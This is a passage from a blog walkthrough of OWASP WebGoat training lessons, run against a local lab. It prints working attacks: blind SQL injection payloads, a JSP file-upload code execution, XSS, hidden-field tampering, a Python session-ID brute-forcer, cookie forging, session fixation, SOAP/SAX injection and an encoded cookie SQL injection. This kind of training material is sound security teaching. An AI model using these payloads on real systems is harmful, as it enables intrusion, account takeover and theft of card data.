</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="mi">101</span> <span class="k">AND</span> <span class="p">((</span><span class="k">SELECT</span> <span class="n">pin</span> <span class="k">FROM</span> <span class="n">pins</span> <span class="k">WHERE</span> <span class="n">cc_number</span><span class="o">=</span><span class="s1">&#39;1111222233334444&#39;</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">10000</span> <span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>Repeating this a couple of times, I determine that the PIN is higher than 2000 but lower than 2500. I will show here how to use Burp Suite for finding the right value.</p>

<ul>
<li><p>Start Burp and capture a normal request to the page</p></li>
<li><p>Send it to Intruder</p></li>
<li><p>In the Positions tab, keep only the relevant position (the account_number), and add a statement checking if the tested value is equal to the condition. It looks like this: <code>account_number=101 and 1=((SELECT pin FROM pins WHERE cc_number = &lsquo;1111222233334444&rsquo;)=§§)&amp;SUBMIT=Go%21</code>. The type of attack is the Sniper attack.</p></li>
<li><p>In the Payloads tab, load a file with some values</p></li>
<li><p>In the Options tab, under Grep-Match, add strings to be matched in responses (the messages for valid and invalind account numbers. Don&rsquo;t forget the dot at the end). And under Redirections, check to always follow redirections and to process cookies in redirections</p></li>
<li><p>Start the attack. Here&rsquo;s an example of the results:</p></li>
</ul>


<p><img class="center" src="http://chousensha.github.io/images/webgoat/intruder.png" title="burp intruder attack" alt="burp intruder attack"></p>

<p>The correct PIN is 2364.</p>

<p><strong>Blind String SQL Injection</strong></p>

<p>The form below allows a user to enter an account number and determine if it is valid or not. Use this form to develop a true / false test check other entries in the database.</p>

<p>Reference Ascii Values: &lsquo;A&rsquo; = 65 &lsquo;Z&rsquo; = 90 &lsquo;a&rsquo; = 97 &lsquo;z&rsquo; = 122</p>

<p>The goal is to find the value of the field name in table pins for the row with the cc_number of 4321432143214321. The field is of type varchar, which is a string.</p>

<p>Put the discovered name in the form to pass the lesson. Only the discovered name should be put into the form field, paying close attention to the spelling and capitalization.</p>

<p>This is a variation of the previous attack. The difference is now we&rsquo;re dealing with a string.</p>

<p>The way to perform this attack is to use the SUBSTRING method to check for a boolean condition:</p>

<p><strong>SUBSTRING ( expression ,start , length )</strong></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="mi">101</span> <span class="k">AND</span> <span class="p">(</span><span class="k">SUBSTRING</span><span class="p">((</span><span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">pins</span> <span class="k">WHERE</span> <span class="n">cc_number</span><span class="o">=</span><span class="s1">&#39;4321432143214321&#39;</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&lt;</span> <span class="s1">&#39;Z&#39;</span> <span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This will check if the first letter of the name is lower than the ASCII value of letter Z. After you determine the first letter, you can continue testing for the next:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='sql'><span class='line'><span class="mi">101</span> <span class="k">AND</span> <span class="p">(</span><span class="k">SUBSTRING</span><span class="p">((</span><span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">pins</span> <span class="k">WHERE</span> <span class="n">cc_number</span><span class="o">=</span><span class="s1">&#39;4321432143214321&#39;</span><span class="p">),</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&gt;</span> <span class="s1">&#39;a&#39;</span> <span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>You can use BurpSuite like I did previously, to test for the letters. Something like: <code>account_number=101 AND (SUBSTRING((SELECT name FROM pins WHERE cc_number=&lsquo;4321432143214321&rsquo;), 1, 1) = &lsquo;J&rsquo; )&amp;SUBMIT=Go%21</code>, then move to the next letter, and so on. The payload position should be between the quotes.</p>

<p>The name we&rsquo;re looking for is Jill.</p>

<h3>Denial of Service</h3>

<p><strong>Denial of Service from Multiple Logins</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/dos.png" title="dos" alt="dos"></p>

<p>This means that, if we exceed the multiple logins treshold, which is 2, the application should choke. First let&rsquo;s find out some user details:</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/dos_login.png" title="dos login" alt="dos login"></p>

<p>Login 3 times to complete this lesson.</p>

<h3>Insecure Communication</h3>

<p><strong>Insecure Login</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/insecure_login.png" title="insecure login" alt="insecure login"></p>

<p>I started Wireshark and sniffed the the password. Here&rsquo;s how it looks like:</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/sniff.png" title="sniff password" alt="sniff passwod"></p>

<p>The password is sniffy.</p>

<p><strong>Stage2:</strong> Now you have to change to a secure connection. The URL should start with <a href="https://">https://</a> If your browser is complaining about the certificate just ignore it. Sniff again the traffic and answer the questions</p>

<p>This time, with the use of SSL, the password is no longer transmitted in plain text.</p>

<h3>Insecure Configuration</h3>

<p><strong>Forced Browsing</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
How to Exploit Forced Browsing.</p>

<p><strong>How the attack works:</strong>
Forced browsing is a technique used by attackers to gain access to resources that are not referenced, but are nevertheless accessible. One technique is to manipulate the URL in the browser by deleting sections from the end until an unprotected directory is found</p>

<p>*Your goal should be to try to guess the URL for the &ldquo;config&rdquo; interface.</p>

<p>*The &ldquo;config&rdquo; URL is only available to the maintenance personnel.</p>

<p>*The application doesn&rsquo;t check for horizontal privileges.</p>

<p>Can you try to force browse to the config page which should only be accessed by maintenance personnel?</p>

<p>The URL is <a href="http://localhost:8080/WebGoat/conf">http://localhost:8080/WebGoat/conf</a></p>

<h3>Insecure Storage</h3>

<p><strong>Encoding Basics</strong></p>

<p>This lesson will familiarize the user with different encoding schemes.</p>

<p>You can enter strings and see how they are encoded with different algorithms.</p>

<h3>Malicious Execution</h3>

<p><strong>Malicious File Execution</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/malware.png" title="malicious file execution" alt="malicious file execution"></p>

<p>Upload an image. Then right-click it and select View Image Info (Firefox) to discover the upload path. The images get uploaded in the <a href="http://localhost:8080/WebGoat/uploads/">http://localhost:8080/WebGoat/uploads/</a> path</p>

<p>Armed with this knowledge, we can now upload a file containing code that creates the guest.txt file in the required location. Because of the underlying web application architecture, I had to use Java for this (hardly my choice for any coding). So I borrowed from the solution:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;html&gt;</span>
</span><span class='line'><span class="err">&lt;</span>% java.io.File file = new java.io.File(&quot;/root/WebGoat-5.4/tomcat/webapps/WebGoat/mfe_target/guest.txt&quot;);
</span><span class='line'>file.createNewFile(); %&gt;
</span><span class='line'><span class="nt">&lt;/html&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>I uploaded it as exe.jsp. Then I went to <a href="http://localhost:8080/WebGoat/uploads/exe.jsp.">http://localhost:8080/WebGoat/uploads/exe.jsp.</a> When you navigate to your uploaded file, you will see a blank page, but your code has executed. Refresh the lesson to complete it.</p>

<h3>Parameter Tampering</h3>

<p><strong>Bypass HTML Field Restrictions</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/html_fields.png" title="html field restrictions" alt="html field restrictions"></p>

<p>For this, I used a combination of Live HTTP Headers and Firebug. I used Firebug to enable the disabled field by delething this part: <code>disabled=&ldquo;&rdquo;</code>. For the rest, I just intercepted the request and added random numbers and characters (including in the Submit button).</p>

<p><strong>Exploit Hidden Fields</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
Developers will use hidden fields for tracking, login, pricing, etc.. information on a loaded page. While this is a convenient and easy mechanism for the developer, they often don&rsquo;t validate the information that is received from the hidden field. This lesson will teach the attacker to find and modify hidden fields to obtain a product for a price other than the price specified</p>

<p><strong>General Goal(s):</strong>
The user should be able to exploit a hidden field to obtain a product at an incorrect price. Try to purchase the HDTV for less than the purchase price, if you have not done so already.</p>

<p>This is another shopping cart functionality. Find this in the source:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">&quot;HIDDEN&quot;</span> <span class="na">value=</span><span class="s">&quot;2999.99&quot;</span> <span class="na">name=</span><span class="s">&quot;Price&quot;</span><span class="nt">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Edit it, and buy.</p>

<p><strong>Exploit Unchecked Email</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
It is always a good practice to validate all inputs. Most sites allow non-authenticated users to send email to a &lsquo;friend&rsquo;. This is a great mechanism for spammers to send out email using your corporate mail server.</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/mail.png" title="mail" alt="mail"></p>

<p>The first part of the attack is to add a script to the comment box. I entered a simple XSS alert:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;script&gt;alert('Let's play Goat Simulator!')&lt;/script&gt;</span></code></pre></td></tr></table></div></figure>


<p>You will see this: <em>The attack worked! Now try to attack another person than the admin.</em></p>

<p>For the second part, I intercepted the request with WebScarab and modified the mail address from the <em>to</em> field to an arbitrary address.</p>

<p><strong>Bypass Client Side JavaScript Validation</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
Client-side validation should not be considered a secure means of validating parameters. These validations only help reduce the amount of server processing time for normal users who do not know the format of required input. Attackers can bypass these mechanisms easily in various ways. Any client-side validation should be duplicated on the server side. This will greatly reduce the likelihood of insecure parameter values being used in the application.</p>

<p><strong>General Goal(s):</strong>
For this exercise, the web site requires that you follow certain rules when you fill out a form. The user should be able to break those rules, and send the website input that it wasn&rsquo;t expecting.</p>

<p>For this, I just used WebScarab to add some @ symbols in each field.</p>

<h3>Session Management Flaws</h3>

<p><strong>Hijack a Session</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/session_hijack.png" title="session hijack" alt="session hijack"></p>

<p>When trying to log in, we can see a session ID that is not present on successful login: <code>WEAKID=10185-1409598474670</code>. This changes with every login attempt. To get more information about how the session ID is constructed, I used WebScarab&rsquo;s SessionID Analysis feature. From the Previous Requests list, I selected the POST request that had a 200 OK response (the one ending in WebGoat/attack). I tried to test it, and got the message that no session identifiers were found. I deleted the WEAKID cookie and tested again. This time I got a popup:</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/weakid.png" title="weakid" alt="weakid"></p>

<p>The next step is to collect some session IDs by selecting a number for samples and clicking Fetch. I used 50. Then, in the Analysis tab, select the WEAKID from the Session Identifier list. Here&rsquo;s a sample screen:</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/session_analysis.png" title="weakid analysis" alt="weakid analysis"></p>

<p>The part before the dash seems to increase sequentially, but we can spot some missing sequences: after 10236 comes 10238. So the goal here is to find a valid session ID with one of these missing sessions.</p>

<p>Let&rsquo;s look next at the part after the dash. Here too there is a pattern:</p>

<p>10187-1409601344<strong>499</strong></p>

<p>10188-1409601344<strong>590</strong></p>

<p>And so on. The bold part changes with each request, but in an incremental fashion. Look at the Difference tab. The values are really close to each other, except a few cases where there is a much higher value, sort of a double of the normal values. These are the session IDs that come after the missing IDs, which are the ones we want to use.</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/diff.png" title="id difference" alt="id difference"></p>

<p>In this example, we want the ID starting with 10208, but we don&rsquo;t know the part after the dash. But we know the previous and the next session ID values, so we can set boundaries:</p>

<p>10207-1409601346<strong>563</strong></p>

<p>10208-1409601346<strong>???</strong></p>

<p>10209-1409601346<strong>658</strong></p>

<p>Our session ID is between 564 and 657. I wrote a Python script to bruteforce the value:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">requests</span>
</span><span class='line'>
</span><span class='line'><span class="n">url</span> <span class="o">=</span> <span class="s">&#39;http://localhost:8080/WebGoat/attack?Screen=72&amp;menu=1800 HTTP/1.1&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">for</span> <span class="n">wid</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">564</span><span class="p">,</span> <span class="mi">658</span><span class="p">):</span>
</span><span class='line'>    <span class="n">weakid</span> <span class="o">=</span> <span class="s">&quot;10208-1409601346</span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">wid</span>
</span><span class='line'>    <span class="n">hdrs</span> <span class="o">=</span> <span class="p">{</span>
</span><span class='line'>        <span class="s">&#39;Host&#39;</span><span class="p">:</span> <span class="s">&#39;localhost:8080&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s">&#39;Firepython&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s">&#39;Accept&#39;</span><span class="p">:</span> <span class="s">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s">&#39;Accept-Language&#39;</span><span class="p">:</span> <span class="s">&#39;en-US,en;q=0.5&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s">&#39;Accept-Encoding&#39;</span><span class="p">:</span> <span class="s">&#39;gzip, deflate&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s">&#39;Referer&#39;</span><span class="p">:</span> <span class="s">&#39;http://localhost:8080/WebGoat/attack?Screen=72&amp;menu=1800&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s">&#39;Cookie&#39;</span><span class="p">:</span> <span class="s">&#39;JSESSIONID=C22137013C4AA4A8D3D0FA4FB003DC37; __utma=111872281.104604641.1404757910.1408742568.1409390732.25; __utmz=111872281.1404757910.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none);WEAKID=</span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">weakid</span><span class="p">,</span>
</span><span class='line'>        <span class="s">&#39;Connection&#39;</span><span class="p">:</span> <span class="s">&#39;keep-alive&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s">&#39;Content-Type&#39;</span><span class="p">:</span> <span class="s">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s">&#39;Content-length&#39;</span><span class="p">:</span> <span class="s">&#39;67&#39;</span><span class="p">,</span>
</span><span class='line'>        <span class="s">&#39;Authorization&#39;</span><span class="p">:</span> <span class="s">&#39;Basic Z3Vlc3Q6Z3Vlc3Q=&#39;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="s">&#39;Username&#39;</span><span class="p">:</span> <span class="s">&#39;goat&#39;</span><span class="p">,</span>
</span><span class='line'>    <span class="s">&#39;Password&#39;</span><span class="p">:</span> <span class="s">&#39;goat&#39;</span><span class="p">,</span>
</span><span class='line'>    <span class="s">&#39;WEAKID&#39;</span><span class="p">:</span> <span class="n">weakid</span><span class="p">,</span>
</span><span class='line'>    <span class="s">&#39;SUBMIT&#39;</span><span class="p">:</span> <span class="s">&#39;Login&#39;</span><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">req</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">payload</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">hdrs</span><span class="p">)</span>
</span><span class='line'>    <span class="n">response</span> <span class="o">=</span> <span class="n">req</span><span class="o">.</span><span class="n">text</span>
</span><span class='line'>    <span class="k">if</span> <span class="s">&#39;Congratulations&#39;</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
</span><span class='line'>        <span class="k">print</span> <span class="n">response</span>
</span><span class='line'>        <span class="k">print</span> <span class="n">weakid</span>
</span></code></pre></td></tr></table></div></figure>


<p>The weak ID discovered by this script was 10208-1409601346610. I refreshed the page, and the lesson was complete.</p>

<p><strong>Spoof an Authentication Cookie</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
Many applications will automatically log a user into their site if the right authentication cookie is specified.   Some times the cookie values can be guessed if the algorithm for generating the cookie can be obtained.  Some times the cookies are left on the client machine and can be stolen by exploiting another system vulnerability.  Some times the cookies may be intercepted using Cross site scripting.  This lesson tries to make the student aware of authentication cookies and presents the student with a way to defeat the cookie authentication method in this lesson.</p>

<p><strong>General Goal(s):</strong>
The user should be able to bypass the authentication check. Login using the webgoat/webgoat account to see what happens. You may also try aspect/aspect. When you understand the authentication cookie, try changing your identity to alice.</p>

<p>Logging in as webgoat, I see the following:</p>

<p>*Your identity has been remembered</p>

<p>Welcome, webgoat</p>

<p>You have been authenticated with PARAMETERS</p>

<p>And I now have an AuthCookie with the value 65432ubphcfx. If I log in as aspect, the value of the cookie is 65432udfqtb. So the differing bits are:</p>

<p>webgoat: <strong>ubphcfx</strong></p>

<p>aspect: <strong>udfqtb</strong></p>

<p>The first thing to notice is the value length corresponds to the length of the username. When trying to make further sense of it, you notice a pattern:</p>

<ul>
<li><p>The letters in the username are reversed</p></li>
<li><p>Each letter is replaced with the next letter in the alphabet</p></li>
</ul>


<p>And the example for aspect:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>a -&gt; b
</span><span class='line'>s -&gt; tb
</span><span class='line'>p -&gt; qtb
</span><span class='line'>e -&gt; fqtb
</span><span class='line'>c -&gt; dfqtb
</span><span class='line'>t -&gt; udfqtb</span></code></pre></td></tr></table></div></figure>


<p>So now we know how to craft a valid cookie for alice:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>a -&gt; b
</span><span class='line'>l -&gt; mb
</span><span class='line'>i -&gt; jmb
</span><span class='line'>c -&gt; djmb
</span><span class='line'>e -&gt; fdjmb</span></code></pre></td></tr></table></div></figure>


<p>All that&rsquo;s left is to login as alice, intercept the request and add the correct value for the cookie: 65432fdjmb. We now see this:</p>

<p>Welcome, alice</p>

<p>You have been authenticated with COOKIE</p>

<p><strong>Session Fixation</strong></p>

<p><strong>Concept / Topic To Teach:</strong>
How to steal a session with a &lsquo;Session Fixation&rsquo;</p>

<p><strong>How the attack works:</strong>
A user is recognized by the server by an unique Session ID. If a user has logged in and is authorized he does not have to reauthorize when he revisits the application as the user is recognized by the Session ID. In some applications it is possible to deliver the Session ID in the Get-Request. Here is where the attack starts.</p>

<p>An attacker can send a hyperlink to a victim with a chosen Session ID. This can be done for example by a prepared mail which looks like an official mail from the application administrator. If the victim clicks on the link and logs in he is authorized by the Session ID the attacker has chosen. The attacker can visit the page with the same ID and is recognized as the victim and gets logged in without authorization.</p>

<p><strong>General Goal(s):</strong>
This lesson has several stages. You play the attacker but also the victim. After having done this lesson it should be understood how a Session Fixation in general works. It should be also understood that it is a bad idea to use the Get-Request for Session IDs.</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/session_fixation.png" title="session fixation" alt="session fixation"></p>

<p>For this, I added the SID inside the link in the mail body:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">/WebGoat/attack?Screen=56&amp;menu=1800&amp;SID=0123456</span><span class="nt">&gt;</span> Goat Hills Financial<span class="nt">&lt;/a&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/webgoat/session_fixation2.png" title="session fixation stage 2" alt="session fixation stage 2"></p>

<p>Just click on the link for this stage.</p>

<p><strong>STAGE 3:</strong> The bank has asked you to verify your data. Log in to see if your details are correct. Your user name is Jane and your password is tarzan.</p>

<p>Just log in for this one.</p>

<p><strong>STAGE 4:</strong> It is time to steal the session now. Use following link to reach Goat Hills Financial.</p>

<p>You are: Hacker Joe</p>

<p>Jane has logged into her account. Go and grab her session! Use Following link to reach the login screen of the bank:</p>

<p><a href="http://localhost:8080/WebGoat/attack?Screen=56&amp;menu=1800&amp;SID=NOVALIDSESSION">http://localhost:8080/WebGoat/attack?Screen=56&amp;menu=1800&amp;SID=NOVALIDSESSION</a></p>

<p>On the login URL, replace the invalid SID with the one you used previously. You will now see Jane&rsquo;s details.</p>

<h3>Web Services</h3>

<p><strong>Create a SOAP Request</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/soap.png" title="soap" alt="soap"></p>

<p>The answer is 4. Look for the operations under the <code>&lt;wsdl:portType name=&ldquo;SoapRequest&rdquo;></code> tag.</p>

<p><strong>Stage 2</strong> Now, what is the type of the (id) parameter in the &ldquo;getFirstNameRequest&rdquo; method: the answer is int. Chech for it here:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;wsdl:message</span> <span class="na">name=</span><span class="s">&quot;getFirstNameRequest&quot;</span><span class="nt">&gt;</span>
</span><span class='line'><span class="nt">&lt;wsdl:part</span> <span class="na">name=</span><span class="s">&quot;id&quot;</span> <span class="na">type=</span><span class="s">&quot;xsd:int&quot;</span><span class="nt">/&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p><strong>Stage 3</strong> Intercept the request and invoke any method by sending a valid SOAP request for a valid account.</p>

<p>You must access at least 2 of the methods to pass the lesson.</p>

<p>For this I used SoapUI. Start a new project and give it the wsdl URL:</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/soapui.png" title="soapui" alt="soapui"></p>

<p>You will see the available operations under the project. Select one of them and copy the request that you will use in the proxy.</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/soapui2.png" title="soapui2" alt="soapui2"></p>

<p>Replace the question mark with some value:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;id xsi:type="xsd:int"&gt;101&lt;/id&gt;</span></code></pre></td></tr></table></div></figure>


<p>Add the basic authentication credentials, then submit the request, and you will see the response in the right tab. The retrieved first name is Joe.</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/soapui3.png" title="soapui3" alt="soapui3"></p>

<p>Repeat for the other methods. My second choice was the credit card number, and for id 101 it was 987654321.</p>

<p><strong>WSDL Scanning</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/wsdl.png" title="wsdl scanning" alt="wsdl scanning"></p>

<p>The objective here is to obtain some credit card numbers. Let&rsquo;s look again at the WSDL file:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;wsdl:operation</span> <span class="na">name=</span><span class="s">&quot;getCreditCard&quot;</span> <span class="na">parameterOrder=</span><span class="s">&quot;id&quot;</span><span class="nt">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We have a method for retrieving credit cards. All that&rsquo;s left is to, uhm, use it in your favorite proxy: <code>id=101&amp;field=getCreditCard&amp;SUBMIT=Submit</code>.</p>

<p><strong>Web Service SAX Injection</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/sax_inject.png" title="sax injection" alt="sax injection"></p>

<p>The XML displayed on the page controls the password change. The solution was to add some XML for a user with another id than 101, by intercepting the request and adding the XML data in the password field:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="nt">&lt;wsns1:changePassword&gt;</span>
</span><span class='line'><span class="nt">&lt;id</span> <span class="na">xsi:type=</span><span class="s">&#39;xsd:int&#39;</span><span class="nt">&gt;</span>102<span class="nt">&lt;/id&gt;</span>
</span><span class='line'><span class="nt">&lt;password</span> <span class="na">xsi:type=</span><span class="s">&#39;xsd:string&#39;</span><span class="nt">&gt;</span>102<span class="nt">&lt;/password&gt;</span>
</span><span class='line'> <span class="nt">&lt;/wsns1:changePassword&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p><strong>Web Service SQL Injection</strong></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/wsdl_sqli.png" title="wsdl sqli" alt="wsdl sqli"></p>

<p>Again, SoapUI comes to the rescue:</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/soap_sqli.png" title="soap sqli" alt="soap sqli"></p>

<h3>Challenge</h3>

<p><strong>The CHALLENGE!</strong></p>

<p>Your mission is to break the authentication scheme, steal all the credit cards from the database, and then deface the website. You will have to use many of the techniques you have learned in the other lessons. The main webpage to deface for this site is &lsquo;webgoat_challenge_guest.jsp&rsquo;</p>

<p>This lesson doesn&rsquo;t have the option to show the Java code. But from earlier lessons, we know how the Show Java button works:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='html'><span class='line'>onclick=&quot;makeWindow(this.href+ &#39;?source=true&#39;, &#39;Java Source&#39;)
</span></code></pre></td></tr></table></div></figure>


<p>So, we need to go to this URL <code><a href="http://localhost:8080/WebGoat/source?source=true">http://localhost:8080/WebGoat/source?source=true</a></code> from the lesson page. By looking around in the challenge code, we can see these values:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='java'><span class='line'><span class="kd">private</span> <span class="n">String</span> <span class="n">pass</span> <span class="o">=</span> <span class="s">&quot;goodbye&quot;</span><span class="o">;</span>
</span><span class='line'><span class="kd">private</span> <span class="n">String</span> <span class="n">user</span> <span class="o">=</span> <span class="s">&quot;youaretheweakestlink&quot;</span><span class="o">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>We can login now and proceed to the next stage.</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/challenge_creds.png" title="challenge credit cards" alt="challenge credit cards"></p>

<p>Playing around in WebScarab while sending requests, I noticed this cookie that I haven&rsquo;t observed before: <code>user=&ldquo;eW91YXJldGhld2Vha2VzdGxpbms=&rdquo;;</code>. Decoding the Base64, the value is indeed our username, <em>youaretheweakestlink</em>. So I tried some SQL injection on it, but that seemed to break the credit card solution list. In the end, I thought about encoding the injection, since the data in the cookie was Base64 encoded, and it worked!</p>

<p>The injection string that worked was <code>youaretheweakestlink' or &lsquo;1&rsquo;=&lsquo;1</code>, and the encoded variant was <code>eW91YXJldGhld2Vha2VzdGxpbmsnIG9yICcxJz0nMQ==</code>. It didn&rsquo;t work until I also kept the username part.</p>

<p>The final stage is to deface the site.</p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/deface1.png" title="challenge stage 3" alt="challenge stage 3"></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/deface2.png" title="challenge stage 3" alt="challenge stage 3"></p>

<p><img class="center" src="http://chousensha.github.io/images/webgoat/deface3.png" title="challenge stage 3" alt="challenge stage 3"></p>

